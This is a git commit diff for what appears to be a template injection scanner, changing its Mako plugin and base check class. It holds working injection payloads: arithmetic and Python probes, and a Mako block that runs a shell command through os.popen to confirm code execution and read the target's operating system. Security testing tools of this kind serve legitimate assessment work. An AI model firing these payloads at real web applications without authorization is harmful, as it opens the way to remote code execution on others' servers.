2c8c9154844e44cbef33c66734ed9496352aef2d
Emilio Pinna <emilio.pinn@gmail.com>
2016-07-01 11:17:14 +0100

    Detect injection output in polluted response and detect shell command execution

--- plugins/engines/mako/mako.py
+++ plugins/engines/mako/mako.py
@@ -7,54 +7,65 @@ class Mako(Check):
     
     def init(self):
         
-        if not self._check_reflection():
-            return
-            
-        log.warn('Found reflection')
-        self.state['reflection'] = True
-            
-        if not self._check_python():
-            return
-            
-        log.warn('Found python injection')
-        self.state['language'] = 'python'
-        self.state['engine'] = 'mako'    
+        self._check_reflection()
         
-        if not self._check_os():
+        if not self.state.get('reflection'):
             return
             
-        log.warn('Found OS execution')
-        self.state['language'] = 'python'
-        self.state['engine'] = 'mako'  
-    
+        log.warn('Reflection detected')
+        
+        self._check_python()
+            
+        if not self.state.get('language') or  not self.state.get('engine'):
+            return
+            
+        log.warn('Python injection detected')   
+        
+        self._check_os()
+        
+        if not self.state.get('exec'):
+            return
+            
+        log.warn(
+            'Shell command execution detected on \'%s\' operating system' % (
+                self.state.get('os', 'undetected')
+            )
+        )
+
     def _check_python(self):
         
-        randA = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
-        randB = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
+        randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
+        randB = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
         
         payload = '${"%s".join("%s")}' % (randA, randB)
         expected = randA.join(randB)
         
-        return expected == self.channel.req(payload)
+        if expected == self.req(payload):
+            self.state['language'] = 'python'
+            self.state['engine'] = 'mako'
     
     def _check_reflection(self):
         
-        rand = random.randint(1, 10)
-        payload = '${%i*%i}' % (rand, rand)
-        expected = str(rand*rand)
+        randA = random.randint(10, 100)
+        randB = random.randint(10, 100)
+
+        payload = '${%i*%i}' % (randA, randB)
+        expected = str(randA*randB)
         
-        return expected == self.channel.req(payload)
+        if expected == self.req(payload):
+            self.state['reflection'] = True
         
     def _check_os(self):
         
-        expected_rand = random.randint(999, 10000)
+        expected_rand = str(random.randint(999, 10000))
         payload = """<%%
         import os
-        x=os.popen('echo %i').read()
-        %%>
-        ${x}""" % expected_rand
-        
-        return expected_rand == self.channel.req(payload)
-    
-        
-        
+        x=os.popen('echo %s').read()
+        %%>${x}""" % expected_rand
+                
+        if expected_rand == self.req(payload):
+            self.state['exec'] = True      
+
+        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
+                
+        self.state['os'] = self.req(payload) 
--- plugins/generic/check.py
+++ plugins/generic/check.py
@@ -1,15 +1,36 @@
 from core.plugin import Plugin
-from random import randint
+import random
+import re
 
 
 class Check(Plugin):
     
     def __init__(self, channel):
         
+        # HTTP channel
         self.channel = channel
+        
+        # Current state
         self.state = {}
         
+        # Payload wrappers
+        self.rand_left = str(random.randint(10, 100))
+        self.rand_right = str(random.randint(10, 100))
+        self.payload_left = '${%s}' % self.rand_left
+        self.payload_right = '${%s}' % self.rand_right
+    
         self.init()
+        
+    def req(self, payload, wrap = True):
+        
+        if wrap:
+            response = self.channel.req(self.payload_left + payload + self.payload_right)
+            before,_,result = response.partition(self.rand_left)
+            result,_,after = result.partition(self.rand_right)
+        else:
+            result = self.channel.req(payload)
+        
+        return result.strip()
             
     def check(self):
         pass
